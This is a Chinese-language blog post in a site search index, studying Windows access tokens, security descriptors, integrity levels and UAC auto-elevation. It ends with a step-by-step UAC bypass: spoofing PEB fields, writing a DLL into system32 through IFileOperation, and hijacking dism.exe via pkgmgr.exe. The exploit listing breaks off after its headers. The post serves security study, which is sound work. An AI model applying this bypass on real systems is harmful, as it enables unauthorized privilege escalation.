<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>windows 学习（六）-- 权限管理</title>
      <link href="/2026/02/08/2026-02-08-learning_windows_6/"/>
      <url>/2026/02/08/2026-02-08-learning_windows_6/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><h1 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h1><h2 id="权限管理"><a href="#权限管理" class="headerlink" title="权限管理"></a>权限管理</h2><h3 id="Access-Token"><a href="#Access-Token" class="headerlink" title="Access Token"></a>Access Token</h3><p>在内核中，是一个名为 <code>_TOKEN</code> 的结构体。</p><p>核心成员包括：</p><h4 id="UserAndGroups-SID列表"><a href="#UserAndGroups-SID列表" class="headerlink" title="UserAndGroups (SID列表)"></a>UserAndGroups (SID列表)</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//0x10 bytes (sizeof)</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">SID_AND_ATTRIBUTES</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    VOID* Sid;                                                              <span class="comment">//0x0</span></span><br><span class="line">    ULONG Attributes;                                                       <span class="comment">//0x8</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>User SID: S-1-5-21-2352286992-1005746632-3940334147-1000</p><p>S-1-5：标准开头（NT Authority）。</p><p>21-…：域&#x2F;机器的唯一 ID（Machine SID）。</p><p>1000 (RID)：相对 ID，普通用户通常从 1000 开始。</p><table><thead><tr><th>500</th><th>Administrator</th><th>默认管理员（本地）</th></tr></thead><tbody><tr><td>501</td><td>Guest</td><td>来宾账户</td></tr><tr><td>502</td><td>KRBTGT</td><td>Kerberos 服务账户（域）</td></tr><tr><td>512</td><td>Domain Admins</td><td>域管理员组（域）</td></tr><tr><td>513</td><td>Domain Users</td><td>域用户组</td></tr><tr><td>544</td><td>Administrators</td><td>管理员组</td></tr><tr><td>545</td><td>Users</td><td>普通用户组</td></tr><tr><td>1000+</td><td>普通用户&#x2F;组</td><td>本地创建的用户从 1000 或 1001 开始递增</td></tr></tbody></table><p>Group SIDs: 用户所属组（Administrators, Users, Everyone 等）。</p><p>每个组都有一个属性（Attributes）。</p><ul><li>Enabled ：正常的有效组。</li><li>UseForDenyOnly ：在“过滤令牌”（Medium 权限）中，管理员组（S-1-5-32-544）会被标记为这个属性。意味着：这个组不能帮你通过“允许”检查，但如果 ACL 里有针对这个组的“拒绝”项，依然生效。</li></ul><h4 id="Privileges-特权位图"><a href="#Privileges-特权位图" class="headerlink" title="Privileges (特权位图)"></a>Privileges (特权位图)</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//0x18 bytes (sizeof)</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">SEP_TOKEN_PRIVILEGES</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    ULONGLONG Present;        <span class="comment">//0x0</span></span><br><span class="line">    ULONGLONG Enabled;       <span class="comment">//0x8</span></span><br><span class="line">    ULONGLONG EnabledByDefault;<span class="comment">//0x10</span></span><br><span class="line">&#125;; </span><br></pre></td></tr></table></figure><p>其中Present代表可用权限,，如 <code>SeDebugPrivilege</code>（调试权）、<code>SeShutdownPrivilege</code>（关机权），Enabled代表可用权限中开启了的部分，二者的每一个bit位代表着一个权限，对于system进程其两者字段都是 <code>0x0000001ff2ffffbc</code></p><p>通常特权默认存在但是是 <code>Disabled</code>的，你需要调用 <code>AdjustTokenPrivileges</code>去开启它。而 UAC 过滤后的令牌是直接把敏感特权从列表中移除了。</p><h4 id="IntegrityLevelIndex-完整性级别"><a href="#IntegrityLevelIndex-完整性级别" class="headerlink" title="IntegrityLevelIndex (完整性级别)"></a>IntegrityLevelIndex (完整性级别)</h4><p>强制访问控制（Mandatory Integrity Control）。防止低权限进程（如浏览器）篡改高权限进程或系统文件。它是 UAC 和沙箱的核心。</p><ul><li>S-1-16-4096(Low): 沙箱、IE 保护模式。</li><li>S-1-16-8192 (Medium): 标准用户、UAC 过滤后的管理员（默认桌面进程）。</li><li>S-1-16-12288(High): “以管理员身份运行”的进程。</li><li>S-1-16-16384(System): 系统服务。</li></ul><h4 id="TrustLinkedToken（链接令牌）"><a href="#TrustLinkedToken（链接令牌）" class="headerlink" title="TrustLinkedToken（链接令牌）"></a>TrustLinkedToken（链接令牌）</h4><p>如果是过滤令牌，这个字段指向你那个被封印的 High (完整令牌)。当用右键“以管理员运行”时，系统就是顺着这个链子找到 High Token 并用来创建新进程的。</p><h3 id="Security-Descriptor"><a href="#Security-Descriptor" class="headerlink" title="Security Descriptor"></a>Security Descriptor</h3><p>任何内核对象（文件、互斥体、注册表、进程对象本身）头部都挂着这个结构体。它定义了谁可以访问它，以及允许或拒绝哪些操作。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//0x28 bytes (sizeof)</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">SECURITY_DESCRIPTOR</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    UCHAR Revision;                                                         <span class="comment">//0x0</span></span><br><span class="line">    UCHAR Sbz1;                                                             <span class="comment">//0x1</span></span><br><span class="line">    USHORT Control;                                                         <span class="comment">//0x2</span></span><br><span class="line">    VOID* Owner;                                                            <span class="comment">//0x8</span></span><br><span class="line">    VOID* Group;                                                            <span class="comment">//0x10</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">ACL</span>* <span class="title">Sacl</span>;</span>                                                      <span class="comment">//0x18</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">ACL</span>* <span class="title">Dacl</span>;</span>                                                      <span class="comment">//0x20</span></span><br><span class="line">&#125;; </span><br></pre></td></tr></table></figure><p>Owner: 对象所有者的用户或组 SID</p><p>DACL (Discretionary ACL): 定义谁可以&#x2F;不可以对对象执行哪些操作</p><p>SACL (System ACL): 定义哪些访问行为需要被审计（记录到安全日志）</p><p>Windows 在DACL检查之前，先进行完整性级别检查（Mandatory Integrity Control (MIC) 机制）：</p><table><thead><tr><th>请求者 IL</th><th>目标对象 IL</th><th>默认允许的操作</th></tr></thead><tbody><tr><td>Low</td><td>Medium</td><td>读、执行 （受限）</td></tr><tr><td>Low</td><td>High</td><td>无 （完全隔离）</td></tr><tr><td>Medium</td><td>High</td><td>读（部分场景），禁止写&#x2F;注入</td></tr><tr><td>High</td><td>System</td><td>通常禁止</td></tr></tbody></table><ul><li>低完整性进程不能向高完整性进程发送窗口消息 （UIPI）例如模拟点击“确定”绕过 UAC</li><li>低完整性进程不能写入高完整性文件&#x2F;注册表</li><li>低完整性进程不能打开高完整性进程的 HANDLE（如 PROCESS_VM_WRITE）</li></ul><h3 id="User-Account-Control"><a href="#User-Account-Control" class="headerlink" title="User Account Control"></a>User Account Control</h3><p>当一个属于 Administrators 组的用户登录时， LSA （Local Security Authority）会创建  两个访问令牌 ：</p><table><thead><tr><th>令牌类型</th><th>权限特点</th><th>完整性级别</th><th>所属组</th></tr></thead><tbody><tr><td>Standard User Token（过滤令牌）</td><td>移除了高危特权（如 <code>SeDebugPrivilege</code>），禁用 Administrators 组 SID</td><td>Medium</td><td>Users + 其他非管理员组</td></tr><tr><td>Elevated Token（完整令牌）</td><td>包含全部特权和 Administrators SID</td><td>High</td><td>Administrators + Users + 所有组</td></tr></tbody></table><h4 id="UAC提权机制"><a href="#UAC提权机制" class="headerlink" title="UAC提权机制"></a>UAC提权机制</h4><p><a href="https://minhangxiaohui.github.io/2024/09/19/UAC%E6%B5%81%E7%A8%8B%E5%8F%8A%E6%8F%90%E6%9D%83%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/">UAC流程及提权原理分析 - ga0weI Blog</a></p><p>根据上面博主的分析，得到以下结果：</p><p>UAC 提权并非由当前用户进程（Client）直接完成，而是通过 RPC 请求系统服务（Server）代为执行。</p><ul><li><strong>发起端</strong> ：<code>explorer.exe</code> 或其他用户进程（Medium Integrity）。</li><li><strong>服务端</strong> <strong>：</strong><code>AppInfo</code> 服务（Application Information Service），宿主于 <code>svchost.exe</code>，拥有 System 权限。</li><li><strong>核心函数</strong> <strong>：</strong><code>AppInfo</code>服务中的 <code>RAiLaunchAdminProcess</code> 负责处理提权请求 。</li></ul><p>自动提权判定逻辑（决定是否弹出安全桌面弹窗）</p><p>系统会调用 <code>AiIsEXESafeToAutoApprove</code>函数进行判定 ，只有同时满足以下三个维度的条件，程序才能静默自动提权</p><h5 id="路径安全校验"><a href="#路径安全校验" class="headerlink" title="路径安全校验"></a>路径安全校验</h5><p>对可执行文件的位置进行”先黑后白”的过滤。</p><ul><li><p>程序路径不能包含以下目录（即使在 Windows 目录下）：</p><ul><li><code>\Windows\Debug</code></li><li><code>\Windows\PCHealth</code></li><li><code>\Windows\Registration</code></li><li><code>\Windows\System32\com</code></li><li><code>\Windows\System32\Spool</code></li><li><code>\Windows\System32\Tasks</code></li><li><code>\Windows\SysWow64\com</code></li><li>…等</li></ul></li><li><p>程序路径必须位于以下受信任目录之一：</p><ul><li><code>\Windows\System32</code>(及其下的 PE 文件)</li><li><code>\Windows\SysWOW64</code></li><li><code>\Windows\ehome</code></li><li><code>\Windows\ImmersiveControlPanel</code></li></ul></li><li><p>特定的系统部署工具也被允许，例如：</p><ul><li><code>\Windows\System32\Sysprep\sysprep.exe</code></li><li><code>\Windows\System32\inetsrv\InetMgr.exe</code></li></ul></li></ul><h5 id="身份与配置校验"><a href="#身份与配置校验" class="headerlink" title="身份与配置校验"></a>身份与配置校验</h5><p>程序必须满足以下任一条件以证明其提权意图的合法性：</p><p>Manifest 标记 ：可执行文件的 Manifest 中必须包含 <code>autoElevate</code>元素且值为 <code>true</code>。</p><p>白名单列表：程序必须存在于 <code>g_lpAutoApproveEXEList</code> 列表中（如 <code>pkgmgr.exe</code>等系统工具）。</p><p><img src="/image/2025-12-30-learning_windows_4/1770548058630.png" alt="1770548058630"></p><h5 id="签名校验"><a href="#签名校验" class="headerlink" title="签名校验"></a>签名校验</h5><p>数字签名：系统会调用 <code>WTGetSignatureInfo</code>校验 PE 文件的数字签名，通常要求必须由 Microsoft 签名。</p><p>文件名一致性 ：校验文件的 <code>OriginalFilename</code>属性是否与当前文件名一致，防止文件名篡改 。</p><h5 id="注册表策略限制"><a href="#注册表策略限制" class="headerlink" title="注册表策略限制"></a>注册表策略限制</h5><p>注册表配置会影响上述判定的生效：</p><p>自动审批开关 ：<code>HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System</code>下的 <code>EnableRestrictedAutoApprove</code> 键值决定是否开启受限自动审批。</p><p>强制签名校验 ：同路径下的 <code>ValidateAdminCodeSignatures</code>键值若开启，则强制要求管理员代码必须经过签名校验。</p><h4 id="Bypass-UAC"><a href="#Bypass-UAC" class="headerlink" title="Bypass UAC"></a>Bypass UAC</h4><h5 id="dll劫持UAC白名单程序"><a href="#dll劫持UAC白名单程序" class="headerlink" title="dll劫持UAC白名单程序"></a>dll劫持UAC白名单程序</h5><h6 id="利用方法"><a href="#利用方法" class="headerlink" title="利用方法"></a>利用方法</h6><p>通过利用 <code>IFileOperation</code> COM 接口往高权限目录（system32\syswow）写dll文件，dllHijack劫持windows内置的能够不弹窗自提权的exe，从而实现提权；</p><p>当com组件调用时，会通过下面四个区域判别调用者是否是其受信的调用者，因此可以修改以下四个区域为可信程序如（explorer.exe、rundll32.exe等微软信任程序）</p><ul><li>Peb-&gt;ProcessParameters-&gt;ImagePathName</li><li>Peb-&gt;ProcessParameters-&gt;CommandLine</li><li>PEB-&gt;Ldr-&gt;FullDllName</li><li>PEB-&gt;Ldr-&gt;BaseDllName；</li></ul><p>该方式利用uac校验流程 <code>AilsEXESafeToAutoApprove</code>里面的 <code>g_lpAutoApproveEXEList</code>白名单中的pkgmgr.exe ，绕过uac弹窗</p><p>运行命令 <code>pkgmgr /iu:TelnetClient</code> ，为windows安装telnet，通过ProcessMonitor发现其加载dism.exe</p><p><img src="/image/2025-12-30-learning_windows_4/1770622797128.png" alt="1770622797128"></p><p>dism.exe加载的dll如下，根据dll加载的优先级，我们可以将dll注入到system32的目录</p><p><img src="/image/2025-12-30-learning_windows_4/1770622919005.png" alt="1770622919005"></p><p>具体代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br><span class="line">631</span><br><span class="line">632</span><br><span class="line">633</span><br><span class="line">634</span><br><span class="line">635</span><br><span class="line">636</span><br><span class="line">637</span><br><span class="line">638</span><br><span class="line">639</span><br><span class="line">640</span><br><span class="line">641</span><br><span class="line">642</span><br><span class="line">643</span><br><span class="line">644</span><br><span class="line">645</span><br><span class="line">646</span><br><span class="line">647</span><br><span class="line">648</span><br><span class="line">649</span><br><span class="line">650</span><br><span class="line">651</span><br><span class="line">652</span><br><span class="line">653</span><br><span class="line">654</span><br><span class="line">655</span><br><span class="line">656</span><br><span class="line">657</span><br><span class="line">658</span><br><span class="line">659</span><br><span class="line">660</span><br><span class="line">661</span><br><span class="line">662</span><br><span class="line">663</span><br><span class="line">664</span><br><span class="line">665</span><br><span class="line">666</span><br><span class="line">667</span><br><span class="line">668</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;shobjidl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> RTL_MAX_DRIVE_LETTERS 32</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GDI_HANDLE_BUFFER_SIZE32  34</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GDI_HANDLE_BUFFER_SIZE64  60</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GDI_BATCH_BUFFER_SIZE 310</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NtCurrentProcess() ( (HANDLE)(LONG_PTR) -1 )</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> NT_SUCCESS</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NT_SUCCESS(Status) (((NTSTATUS)(Status)) &gt;= 0)</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> !defined(_M_X64)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GDI_HANDLE_BUFFER_SIZE      GDI_HANDLE_BUFFER_SIZE32</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GDI_HANDLE_BUFFER_SIZE      GDI_HANDLE_BUFFER_SIZE64</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> ULONG GDI_HANDLE_BUFFER32[GDI_HANDLE_BUFFER_SIZE32];</span><br><span class="line"><span class="keyword">typedef</span> ULONG GDI_HANDLE_BUFFER64[GDI_HANDLE_BUFFER_SIZE64];</span><br><span class="line"><span class="keyword">typedef</span> ULONG GDI_HANDLE_BUFFER[GDI_HANDLE_BUFFER_SIZE];</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span 